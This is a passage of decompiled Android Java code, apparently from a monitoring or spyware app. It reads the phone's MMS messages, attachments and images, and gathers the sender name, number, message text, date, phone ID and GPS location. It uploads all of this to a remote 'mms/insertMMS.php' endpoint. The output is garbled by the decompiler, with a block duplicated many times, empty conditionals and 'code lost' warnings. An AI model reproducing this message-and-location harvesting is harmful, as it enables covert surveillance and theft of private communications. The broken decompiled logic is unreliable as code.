                                                        hashMap2.put("message", sb212222.toString());
                                                        StringBuilder sb222222 = new StringBuilder();
                                                        sb222222.append(str15);
                                                        sb222222.append(str4);
                                                        hashMap2.put("subject", sb222222.toString());
                                                        StringBuilder sb232222 = new StringBuilder();
                                                        sb232222.append(str15);
                                                        sb232222.append(str3);
                                                        hashMap2.put("type", sb232222.toString());
                                                        StringBuilder sb242222 = new StringBuilder();
                                                        sb242222.append(str15);
                                                        sb242222.append(simpleDateFormat2.format(calendar.getTime()));
                                                        hashMap2.put("date", sb242222.toString());
                                                        StringBuilder sb252222 = new StringBuilder();
                                                        sb252222.append(str15);
                                                        sb252222.append(str6);
                                                        hashMap2.put(str13, sb252222.toString());
                                                        StringBuilder sb262222 = new StringBuilder();
                                                        sb262222.append(str15);
                                                        sb262222.append(d72222);
                                                        hashMap2.put("longitude", sb262222.toString());
                                                        StringBuilder sb272222 = new StringBuilder();
                                                        sb272222.append(str15);
                                                        sb272222.append(d82222);
                                                        hashMap2.put("latitude", sb272222.toString());
                                                        StringBuilder sb282222 = new StringBuilder();
                                                        sb282222.append(str15);
                                                        double d92222 = d62222;
                                                        sb282222.append(d92222);
                                                        hashMap2.put("accuracy", sb282222.toString());
                                                        hashMap = hashMap2;
                                                        new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                        StringBuilder sb292222 = new StringBuilder();
                                                        sb292222.append(str15);
                                                        sb292222.append(sb9);
                                                        String sb302222 = sb292222.toString();
                                                        StringBuilder sb312222 = new StringBuilder();
                                                        sb312222.append(str15);
                                                        sb312222.append(sb6);
                                                        String sb322222 = sb312222.toString();
                                                        StringBuilder sb332222 = new StringBuilder();
                                                        sb332222.append(str15);
                                                        sb332222.append(sb3.toString());
                                                        String sb342222 = sb332222.toString();
                                                        int parseInt2222 = Integer.parseInt(str3);
                                                        StringBuilder sb352222 = new StringBuilder();
                                                        sb352222.append(str15);
                                                        sb352222.append(simpleDateFormat2.format(calendar.getTime()));
                                                        String sb362222 = sb352222.toString();
                                                        StringBuilder sb372222 = new StringBuilder();
                                                        sb372222.append(str15);
                                                        sb372222.append(str6);
                                                        String sb382222 = sb372222.toString();
                                                        StringBuilder sb392222 = new StringBuilder();
                                                        sb392222.append(str15);
                                                        sb392222.append(d72222);
                                                        String sb402222 = sb392222.toString();
                                                        StringBuilder sb412222 = new StringBuilder();
                                                        sb412222.append(str15);
                                                        sb412222.append(d82222);
                                                        String sb422222 = sb412222.toString();
                                                        StringBuilder sb432222 = new StringBuilder();
                                                        sb432222.append(str15);
                                                        sb432222.append(d92222);
                                                        String sb442222 = sb432222.toString();
                                                        StringBuilder sb452222 = new StringBuilder();
                                                        sb452222.append(str15);
                                                        sb452222.append(str);
                                                        String sb462222 = sb452222.toString();
                                                        StringBuilder sb472222 = new StringBuilder();
                                                        sb472222.append(str15);
                                                        sb472222.append(a(arrayList32222));
                                                        String sb482222 = sb472222.toString();
                                                        Y y2222 = new Y(this.f226a);
                                                        D d102222 = new D(sb302222, sb322222, sb342222, parseInt2222, sb362222, sb382222, sb402222, sb422222, sb442222, sb462222, sb482222);
                                                        y2222.b();
                                                        j = y2222.a(d102222);
                                                        y2222.a();
                                                        if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                        }
                                                        return;
                                                    }
                                                } else {
                                                    simpleDateFormat2 = simpleDateFormat;
                                                }
                                            } catch (Exception e15) {
                                                e = e15;
                                                simpleDateFormat2 = simpleDateFormat;
                                                str6 = str15;
                                                e.getStackTrace();
                                                double d622222 = d5;
                                                ArrayList arrayList322222 = arrayList2;
                                                double d722222 = d3;
                                                double d822222 = d2;
                                                StringBuilder a422222 = a.a(str15);
                                                a422222.append(e.e(this.f226a));
                                                hashMap2.put("idPhone", a422222.toString());
                                                StringBuilder sb1922222 = new StringBuilder();
                                                sb1922222.append(str15);
                                                sb1922222.append(sb9);
                                                hashMap2.put("name", sb1922222.toString());
                                                StringBuilder sb2022222 = new StringBuilder();
                                                sb2022222.append(str15);
                                                sb2022222.append(sb6);
                                                hashMap2.put("number", sb2022222.toString());
                                                StringBuilder sb2122222 = new StringBuilder();
                                                sb2122222.append(str15);
                                                sb2122222.append(sb3.toString());
                                                hashMap2.put("message", sb2122222.toString());
                                                StringBuilder sb2222222 = new StringBuilder();
                                                sb2222222.append(str15);
                                                sb2222222.append(str4);
                                                hashMap2.put("subject", sb2222222.toString());
                                                StringBuilder sb2322222 = new StringBuilder();
                                                sb2322222.append(str15);
                                                sb2322222.append(str3);
                                                hashMap2.put("type", sb2322222.toString());
                                                StringBuilder sb2422222 = new StringBuilder();
                                                sb2422222.append(str15);
                                                sb2422222.append(simpleDateFormat2.format(calendar.getTime()));
                                                hashMap2.put("date", sb2422222.toString());
                                                StringBuilder sb2522222 = new StringBuilder();
                                                sb2522222.append(str15);
                                                sb2522222.append(str6);
                                                hashMap2.put(str13, sb2522222.toString());
                                                StringBuilder sb2622222 = new StringBuilder();
                                                sb2622222.append(str15);
                                                sb2622222.append(d722222);
                                                hashMap2.put("longitude", sb2622222.toString());
                                                StringBuilder sb2722222 = new StringBuilder();
                                                sb2722222.append(str15);
                                                sb2722222.append(d822222);
                                                hashMap2.put("latitude", sb2722222.toString());
                                                StringBuilder sb2822222 = new StringBuilder();
                                                sb2822222.append(str15);
                                                double d922222 = d622222;
                                                sb2822222.append(d922222);
                                                hashMap2.put("accuracy", sb2822222.toString());
                                                hashMap = hashMap2;
                                                new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                                StringBuilder sb2922222 = new StringBuilder();
                                                sb2922222.append(str15);
                                                sb2922222.append(sb9);
                                                String sb3022222 = sb2922222.toString();
                                                StringBuilder sb3122222 = new StringBuilder();
                                                sb3122222.append(str15);
                                                sb3122222.append(sb6);
                                                String sb3222222 = sb3122222.toString();
                                                StringBuilder sb3322222 = new StringBuilder();
                                                sb3322222.append(str15);
                                                sb3322222.append(sb3.toString());
                                                String sb3422222 = sb3322222.toString();
                                                int parseInt22222 = Integer.parseInt(str3);
                                                StringBuilder sb3522222 = new StringBuilder();
                                                sb3522222.append(str15);
                                                sb3522222.append(simpleDateFormat2.format(calendar.getTime()));
                                                String sb3622222 = sb3522222.toString();
                                                StringBuilder sb3722222 = new StringBuilder();
                                                sb3722222.append(str15);
                                                sb3722222.append(str6);
                                                String sb3822222 = sb3722222.toString();
                                                StringBuilder sb3922222 = new StringBuilder();
                                                sb3922222.append(str15);
                                                sb3922222.append(d722222);
                                                String sb4022222 = sb3922222.toString();
                                                StringBuilder sb4122222 = new StringBuilder();
                                                sb4122222.append(str15);
                                                sb4122222.append(d822222);
                                                String sb4222222 = sb4122222.toString();
                                                StringBuilder sb4322222 = new StringBuilder();
                                                sb4322222.append(str15);
                                                sb4322222.append(d922222);
                                                String sb4422222 = sb4322222.toString();
                                                StringBuilder sb4522222 = new StringBuilder();
                                                sb4522222.append(str15);
                                                sb4522222.append(str);
                                                String sb4622222 = sb4522222.toString();
                                                StringBuilder sb4722222 = new StringBuilder();
                                                sb4722222.append(str15);
                                                sb4722222.append(a(arrayList322222));
                                                String sb4822222 = sb4722222.toString();
                                                Y y22222 = new Y(this.f226a);
                                                D d1022222 = new D(sb3022222, sb3222222, sb3422222, parseInt22222, sb3622222, sb3822222, sb4022222, sb4222222, sb4422222, sb4622222, sb4822222);
                                                y22222.b();
                                                j = y22222.a(d1022222);
                                                y22222.a();
                                                if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                }
                                                return;
                                            }
                                        } catch (Exception e16) {
                                            e = e16;
                                            simpleDateFormat2 = simpleDateFormat;
                                            str6 = str15;
                                            d3 = 0.0d;
                                            d2 = 0.0d;
                                            e.getStackTrace();
                                            double d6222222 = d5;
                                            ArrayList arrayList3222222 = arrayList2;
                                            double d7222222 = d3;
                                            double d8222222 = d2;
                                            StringBuilder a4222222 = a.a(str15);
                                            a4222222.append(e.e(this.f226a));
                                            hashMap2.put("idPhone", a4222222.toString());
                                            StringBuilder sb19222222 = new StringBuilder();
                                            sb19222222.append(str15);
                                            sb19222222.append(sb9);
                                            hashMap2.put("name", sb19222222.toString());
                                            StringBuilder sb20222222 = new StringBuilder();
                                            sb20222222.append(str15);
                                            sb20222222.append(sb6);
                                            hashMap2.put("number", sb20222222.toString());
                                            StringBuilder sb21222222 = new StringBuilder();
                                            sb21222222.append(str15);
                                            sb21222222.append(sb3.toString());
                                            hashMap2.put("message", sb21222222.toString());
                                            StringBuilder sb22222222 = new StringBuilder();
                                            sb22222222.append(str15);
                                            sb22222222.append(str4);
                                            hashMap2.put("subject", sb22222222.toString());
                                            StringBuilder sb23222222 = new StringBuilder();
                                            sb23222222.append(str15);
                                            sb23222222.append(str3);
                                            hashMap2.put("type", sb23222222.toString());
                                            StringBuilder sb24222222 = new StringBuilder();
                                            sb24222222.append(str15);
                                            sb24222222.append(simpleDateFormat2.format(calendar.getTime()));
                                            hashMap2.put("date", sb24222222.toString());
                                            StringBuilder sb25222222 = new StringBuilder();
                                            sb25222222.append(str15);
                                            sb25222222.append(str6);
                                            hashMap2.put(str13, sb25222222.toString());
                                            StringBuilder sb26222222 = new StringBuilder();
                                            sb26222222.append(str15);
                                            sb26222222.append(d7222222);
                                            hashMap2.put("longitude", sb26222222.toString());
                                            StringBuilder sb27222222 = new StringBuilder();
                                            sb27222222.append(str15);
                                            sb27222222.append(d8222222);
                                            hashMap2.put("latitude", sb27222222.toString());
                                            StringBuilder sb28222222 = new StringBuilder();
                                            sb28222222.append(str15);
                                            double d9222222 = d6222222;
                                            sb28222222.append(d9222222);
                                            hashMap2.put("accuracy", sb28222222.toString());
                                            hashMap = hashMap2;
                                            new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                            StringBuilder sb29222222 = new StringBuilder();
                                            sb29222222.append(str15);
                                            sb29222222.append(sb9);
                                            String sb30222222 = sb29222222.toString();
                                            StringBuilder sb31222222 = new StringBuilder();
                                            sb31222222.append(str15);
                                            sb31222222.append(sb6);
                                            String sb32222222 = sb31222222.toString();
                                            StringBuilder sb33222222 = new StringBuilder();
                                            sb33222222.append(str15);
                                            sb33222222.append(sb3.toString());
                                            String sb34222222 = sb33222222.toString();
                                            int parseInt222222 = Integer.parseInt(str3);
                                            StringBuilder sb35222222 = new StringBuilder();
                                            sb35222222.append(str15);
                                            sb35222222.append(simpleDateFormat2.format(calendar.getTime()));
                                            String sb36222222 = sb35222222.toString();
                                            StringBuilder sb37222222 = new StringBuilder();
                                            sb37222222.append(str15);
                                            sb37222222.append(str6);
                                            String sb38222222 = sb37222222.toString();
                                            StringBuilder sb39222222 = new StringBuilder();
                                            sb39222222.append(str15);
                                            sb39222222.append(d7222222);
                                            String sb40222222 = sb39222222.toString();
                                            StringBuilder sb41222222 = new StringBuilder();
                                            sb41222222.append(str15);
                                            sb41222222.append(d8222222);
                                            String sb42222222 = sb41222222.toString();
                                            StringBuilder sb43222222 = new StringBuilder();
                                            sb43222222.append(str15);
                                            sb43222222.append(d9222222);
                                            String sb44222222 = sb43222222.toString();
                                            StringBuilder sb45222222 = new StringBuilder();
                                            sb45222222.append(str15);
                                            sb45222222.append(str);
                                            String sb46222222 = sb45222222.toString();
                                            StringBuilder sb47222222 = new StringBuilder();
                                            sb47222222.append(str15);
                                            sb47222222.append(a(arrayList3222222));
                                            String sb48222222 = sb47222222.toString();
                                            Y y222222 = new Y(this.f226a);
                                            D d10222222 = new D(sb30222222, sb32222222, sb34222222, parseInt222222, sb36222222, sb38222222, sb40222222, sb42222222, sb44222222, sb46222222, sb48222222);
                                            y222222.b();
                                            j = y222222.a(d10222222);
                                            y222222.a();
                                            if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                            }
                                            return;
                                        }
                                        double d62222222 = d5;
                                        ArrayList arrayList32222222 = arrayList2;
                                        double d72222222 = d3;
                                        double d82222222 = d2;
                                        StringBuilder a42222222 = a.a(str15);
                                        a42222222.append(e.e(this.f226a));
                                        hashMap2.put("idPhone", a42222222.toString());
                                        StringBuilder sb192222222 = new StringBuilder();
                                        sb192222222.append(str15);
                                        sb192222222.append(sb9);
                                        hashMap2.put("name", sb192222222.toString());
                                        StringBuilder sb202222222 = new StringBuilder();
                                        sb202222222.append(str15);
                                        sb202222222.append(sb6);
                                        hashMap2.put("number", sb202222222.toString());
                                        StringBuilder sb212222222 = new StringBuilder();
                                        sb212222222.append(str15);
                                        sb212222222.append(sb3.toString());
                                        hashMap2.put("message", sb212222222.toString());
                                        StringBuilder sb222222222 = new StringBuilder();
                                        sb222222222.append(str15);
                                        sb222222222.append(str4);
                                        hashMap2.put("subject", sb222222222.toString());
                                        StringBuilder sb232222222 = new StringBuilder();
                                        sb232222222.append(str15);
                                        sb232222222.append(str3);
                                        hashMap2.put("type", sb232222222.toString());
                                        StringBuilder sb242222222 = new StringBuilder();
                                        sb242222222.append(str15);
                                        sb242222222.append(simpleDateFormat2.format(calendar.getTime()));
                                        hashMap2.put("date", sb242222222.toString());
                                        StringBuilder sb252222222 = new StringBuilder();
                                        sb252222222.append(str15);
                                        sb252222222.append(str6);
                                        hashMap2.put(str13, sb252222222.toString());
                                        StringBuilder sb262222222 = new StringBuilder();
                                        sb262222222.append(str15);
                                        sb262222222.append(d72222222);
                                        hashMap2.put("longitude", sb262222222.toString());
                                        StringBuilder sb272222222 = new StringBuilder();
                                        sb272222222.append(str15);
                                        sb272222222.append(d82222222);
                                        hashMap2.put("latitude", sb272222222.toString());
                                        StringBuilder sb282222222 = new StringBuilder();
                                        sb282222222.append(str15);
                                        double d92222222 = d62222222;
                                        sb282222222.append(d92222222);
                                        hashMap2.put("accuracy", sb282222222.toString());
                                        try {
                                            hashMap = hashMap2;
                                            new k(this.f226a, sb6, sb3.toString(), Integer.parseInt(str3)).start();
                                            StringBuilder sb292222222 = new StringBuilder();
                                            sb292222222.append(str15);
                                            sb292222222.append(sb9);
                                            String sb302222222 = sb292222222.toString();
                                            StringBuilder sb312222222 = new StringBuilder();
                                            sb312222222.append(str15);
                                            sb312222222.append(sb6);
                                            String sb322222222 = sb312222222.toString();
                                            StringBuilder sb332222222 = new StringBuilder();
                                            sb332222222.append(str15);
                                            sb332222222.append(sb3.toString());
                                            String sb342222222 = sb332222222.toString();
                                            int parseInt2222222 = Integer.parseInt(str3);
                                            StringBuilder sb352222222 = new StringBuilder();
                                            sb352222222.append(str15);
                                            sb352222222.append(simpleDateFormat2.format(calendar.getTime()));
                                            String sb362222222 = sb352222222.toString();
                                            StringBuilder sb372222222 = new StringBuilder();
                                            sb372222222.append(str15);
                                            sb372222222.append(str6);
                                            String sb382222222 = sb372222222.toString();
                                            StringBuilder sb392222222 = new StringBuilder();
                                            sb392222222.append(str15);
                                            sb392222222.append(d72222222);
                                            String sb402222222 = sb392222222.toString();
                                            StringBuilder sb412222222 = new StringBuilder();
                                            sb412222222.append(str15);
                                            sb412222222.append(d82222222);
                                            String sb422222222 = sb412222222.toString();
                                            StringBuilder sb432222222 = new StringBuilder();
                                            sb432222222.append(str15);
                                            sb432222222.append(d92222222);
                                            String sb442222222 = sb432222222.toString();
                                            StringBuilder sb452222222 = new StringBuilder();
                                            sb452222222.append(str15);
                                            sb452222222.append(str);
                                            String sb462222222 = sb452222222.toString();
                                            StringBuilder sb472222222 = new StringBuilder();
                                            sb472222222.append(str15);
                                            sb472222222.append(a(arrayList32222222));
                                            String sb482222222 = sb472222222.toString();
                                            Y y2222222 = new Y(this.f226a);
                                            D d102222222 = new D(sb302222222, sb322222222, sb342222222, parseInt2222222, sb362222222, sb382222222, sb402222222, sb422222222, sb442222222, sb462222222, sb482222222);
                                            y2222222.b();
                                            j = y2222222.a(d102222222);
                                            y2222222.a();
                                            if (a.c.e.a.b("mms/insertMMS.php", (Map<String, String>) hashMap)) {
                                                int i5 = (int) j;
                                                try {
                                                    Y y3 = new Y(this.f226a);
                                                    y3.b();
                                                    y3.a(i5);
                                                    y3.a();
                                                } catch (Exception e17) {
                                                    try {
                                                        e17.getStackTrace();
                                                        Crashlytics.logException(e17);
                                                    } catch (Exception unused2) {
                                                    }
                                                }
                                            }
                                        } catch (Exception e18) {
                                            e = e18;
                                            e.getStackTrace();
                                            e.getStackTrace();
                                            Crashlytics.logException(e);
                                            return;
                                        }
                                    }
                                    return;
                                }
                                do {
                                    String string = query.getString(query.getColumnIndex(str13));
                                    if (string != null && !string.contains(str10)) {
                                        try {
                                            sb2.append(c.a(this.f226a, string.replace(str9, str15)));
                                            sb2.append(str14);
                                        } catch (NumberFormatException e19) {
                                            e19.getStackTrace();
                                            sb2.append(c.a(this.f226a, string));
                                            sb2.append(str14);
                                        }
                                    }
                                } while (query.moveToNext());
                                if (query != null) {
                                }
                                String sb92 = sb2.toString();
                                HashMap hashMap22 = new HashMap();
                                String str172 = "dataSize";
                                if (arrayList.size() != 0) {
                                }
                                str4 = str;
                                if (str4 != null) {
                                }
                            } catch (Exception e20) {
                                e20.getStackTrace();
                            }
                        } else {
                            do {
                                String string2 = query2.getString(query2.getColumnIndex(str13));
                                if (string2 != null && !string2.contains(str10)) {
                                    Long.parseLong(string2.replace(str9, str15));
                                    sb.append(string2);
                                    sb.append(str14);
                                    sb.append(string2);
                                    sb.append(str14);
                                }
                            } while (query2.moveToNext());
                            if (query2 != null) {
                            }
                            String sb62 = sb.toString();
                            sb2 = new StringBuilder();
                            sb2.append(str15);
                            StringBuilder sb72 = new StringBuilder();
                            sb72.append(str12);
                            sb72.append(i3);
                            String sb82 = sb72.toString();
                            query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb82, null, null);
                            if (query != null) {
                            }
                            if (query != null) {
                            }
                            String sb922 = sb2.toString();
                            HashMap hashMap222 = new HashMap();
                            String str1722 = "dataSize";
                            if (arrayList.size() != 0) {
                            }
                            str4 = str;
                            if (str4 != null) {
                            }
                        }
                    } catch (Exception e21) {
                        e21.getStackTrace();
                    }
                } else {
                    while (true) {
                        String string3 = query3.getString(query3.getColumnIndex("ct"));
                        simpleDateFormat = d4;
                        try {
                            String string4 = query3.getString(query3.getColumnIndex("_id"));
                            if (!string3.equalsIgnoreCase("text/plain")) {
                                if (!string3.equalsIgnoreCase("image/jpg") && !string3.equalsIgnoreCase("image/jpeg") && !string3.equalsIgnoreCase("image/png") && !string3.equalsIgnoreCase("image/gif")) {
                                    if (!string3.equalsIgnoreCase("image/bmp")) {
                                        z = false;
                                        if (z) {
                                            arrayList.add(a(string4));
                                        }
                                    }
                                }
                                z = true;
                                if (z) {
                                }
                            } else if (query3.getString(query3.getColumnIndex("_data")) != null) {
                                sb3.append(b(string4));
                                sb3.append(str14);
                            } else {
                                sb3.append(query3.getString(query3.getColumnIndex("text")));
                                sb3.append(str14);
                            }
                            if (!query3.moveToPrevious()) {
                                break;
                            }
                            String str19 = str;
                            d4 = simpleDateFormat;
                        } catch (Exception e22) {
                            e = e22;
                            e.getStackTrace();
                            sb = new StringBuilder();
                            sb.append(str15);
                            StringBuilder sb52 = new StringBuilder();
                            sb52.append(str12);
                            sb52.append(i3);
                            String str162 = new String(sb52.toString());
                            query2 = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, str162, null, null);
                            if (query2 != null) {
                            }
                            if (query2 != null) {
                            }
                            String sb622 = sb.toString();
                            sb2 = new StringBuilder();
                            sb2.append(str15);
                            StringBuilder sb722 = new StringBuilder();
                            sb722.append(str12);
                            sb722.append(i3);
                            String sb822 = sb722.toString();
                            query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb822, null, null);
                            if (query != null) {
                            }
                            if (query != null) {
                            }
                            String sb9222 = sb2.toString();
                            HashMap hashMap2222 = new HashMap();
                            String str17222 = "dataSize";
                            if (arrayList.size() != 0) {
                            }
                            str4 = str;
                            if (str4 != null) {
                            }
                        }
                    }
                    sb = new StringBuilder();
                    sb.append(str15);
                    StringBuilder sb522 = new StringBuilder();
                    sb522.append(str12);
                    sb522.append(i3);
                    String str1622 = new String(sb522.toString());
                    query2 = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, str1622, null, null);
                    if (query2 != null) {
                    }
                    if (query2 != null) {
                    }
                    String sb6222 = sb.toString();
                    sb2 = new StringBuilder();
                    sb2.append(str15);
                    StringBuilder sb7222 = new StringBuilder();
                    sb7222.append(str12);
                    sb7222.append(i3);
                    String sb8222 = sb7222.toString();
                    query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb8222, null, null);
                    if (query != null) {
                    }
                    if (query != null) {
                    }
                    String sb92222 = sb2.toString();
                    HashMap hashMap22222 = new HashMap();
                    String str172222 = "dataSize";
                    if (arrayList.size() != 0) {
                    }
                    str4 = str;
                    if (str4 != null) {
                    }
                }
            } catch (Exception e23) {
                e = e23;
                simpleDateFormat = d4;
                e.getStackTrace();
                sb = new StringBuilder();
                sb.append(str15);
                StringBuilder sb5222 = new StringBuilder();
                sb5222.append(str12);
                sb5222.append(i3);
                String str16222 = new String(sb5222.toString());
                query2 = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, str16222, null, null);
                if (query2 != null) {
                }
                if (query2 != null) {
                }
                String sb62222 = sb.toString();
                sb2 = new StringBuilder();
                sb2.append(str15);
                StringBuilder sb72222 = new StringBuilder();
                sb72222.append(str12);
                sb72222.append(i3);
                String sb82222 = sb72222.toString();
                query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb82222, null, null);
                if (query != null) {
                }
                if (query != null) {
                }
                String sb922222 = sb2.toString();
                HashMap hashMap222222 = new HashMap();
                String str1722222 = "dataSize";
                if (arrayList.size() != 0) {
                }
                str4 = str;
                if (str4 != null) {
                }
            }
        } catch (Exception e24) {
            e = e24;
            calendar = instance;
            simpleDateFormat = d4;
            e.getStackTrace();
            sb = new StringBuilder();
            sb.append(str15);
            StringBuilder sb52222 = new StringBuilder();
            sb52222.append(str12);
            sb52222.append(i3);
            String str162222 = new String(sb52222.toString());
            query2 = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, str162222, null, null);
            if (query2 != null) {
            }
            if (query2 != null) {
            }
            String sb622222 = sb.toString();
            sb2 = new StringBuilder();
            sb2.append(str15);
            StringBuilder sb722222 = new StringBuilder();
            sb722222.append(str12);
            sb722222.append(i3);
            String sb822222 = sb722222.toString();
            query = this.f226a.getContentResolver().query(Uri.parse(MessageFormat.format(str11, new Object[]{Integer.valueOf(i)})), null, sb822222, null, null);
            if (query != null) {
            }
            if (query != null) {
            }
            String sb9222222 = sb2.toString();
            HashMap hashMap2222222 = new HashMap();
            String str17222222 = "dataSize";
            if (arrayList.size() != 0) {
            }
            str4 = str;
            if (str4 != null) {
            }
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(4:10|(0)|17|18) */
    /* JADX WARNING: Code restructure failed: missing block: B:21:0x0037, code lost:
        if (r4 != null) goto L_0x0026;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:7:0x0024, code lost:
        if (r4 != null) goto L_0x0026;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:9:?, code lost:
        r4.close();
     */
    /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x0035 */
    /* JADX WARNING: Removed duplicated region for block: B:15:0x0032 A[SYNTHETIC, Splitter:B:15:0x0032] */
    private Bitmap a(String str) {
        InputStream inputStream;
        Bitmap bitmap = null;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("content://mms/part/");
            sb.append(str);
            try {
                inputStream = this.f226a.getContentResolver().openInputStream(Uri.parse(sb.toString()));
                try {
                    bitmap = BitmapFactory.decodeStream(inputStream);
                } catch (IOException unused) {
                } catch (Throwable th) {
                    th = th;
                    if (inputStream != null) {
                    }
                    throw th;
                }
            } catch (IOException unused2) {
                inputStream = null;
            } catch (Throwable th2) {
                th = th2;
                inputStream = null;
                if (inputStream != null) {
                    inputStream.close();
                }
                throw th;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return bitmap;
    }

    private String a(ArrayList<String> arrayList) {
        int i = 0;
        String str = "";
        while (i < arrayList.size()) {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append((String) arrayList.get(i));
                str = sb.toString();
                if (i < arrayList.size() - 1) {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str);
                    sb2.append(this.f228c);
                    str = sb2.toString();
                }
                i++;
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
        return str;
    }
}
